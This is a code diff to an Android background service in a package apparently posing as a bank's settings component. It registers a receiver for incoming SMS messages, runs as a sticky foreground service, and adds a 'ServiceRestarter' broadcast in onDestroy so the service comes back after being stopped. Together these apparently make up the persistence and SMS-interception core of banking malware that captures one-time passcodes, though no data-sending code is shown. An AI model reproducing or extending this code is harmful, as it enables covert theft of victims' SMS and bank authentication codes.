@@ -10,14 +10,16 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.os.Build;
 import android.os.IBinder;
+import android.util.Log;
 
 import androidx.core.app.NotificationCompat;
 
+import com.union.bank.service.settings.Helper;
 import com.union.bank.service.settings.MainActivity;
 
 public class BackgroundService extends Service {
 
-    private static final String TAG = "BackgroundService";
+    private static final String TAG = Helper.TAG;
     private static final String CHANNEL_ID = "SmsServiceChannel";
     private SmsReceiver smsReceiver;
 
@@ -25,47 +27,46 @@ public class BackgroundService extends Service {
     public void onCreate() {
         super.onCreate();
         createNotificationChannel();
-
-        // Register the SMS receiver
-        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
-        smsReceiver = new SmsReceiver();
-        registerReceiver(smsReceiver, filter);
-
-        // Start the service in the foreground
+        // Log.d(Helper.TAG, "Bg Service Created");
         startForegroundService();
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        //Log.d(TAG, "Foreground service running");
+        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
+        smsReceiver = new SmsReceiver();
+        registerReceiver(smsReceiver, filter);
+        Log.d(TAG, "Foreground service running");
         return START_STICKY;
     }
 
     @Override
     public void onDestroy() {
         super.onDestroy();
-        //Log.d(TAG, "Foreground service destroyed");
+        Log.d(TAG, "Foreground service destroyed");
         if (smsReceiver != null) {
             unregisterReceiver(smsReceiver);
             smsReceiver = null;
         }
+        Intent broadcastIntent = new Intent(this, ServiceRestarter.class);
+        sendBroadcast(broadcastIntent);
     }
 
     @Override
     public IBinder onBind(Intent intent) {
-        //Log.d(TAG, "onBind called - not used for started services");
+        Log.d(TAG, "onBind called - not used for started services");
         return null;
     }
 
     @Override
     public boolean onUnbind(Intent intent) {
-        //Log.d(TAG, "onUnbind called - service is being unbound");
+        Log.d(TAG, "onUnbind called - service is being unbound");
         return super.onUnbind(intent);
     }
 
     @Override
     public void onRebind(Intent intent) {
-        //Log.d(TAG, "onRebind called - service is being rebound");
+        Log.d(TAG, "onRebind called - service is being rebound");
         super.onRebind(intent);
     }
 
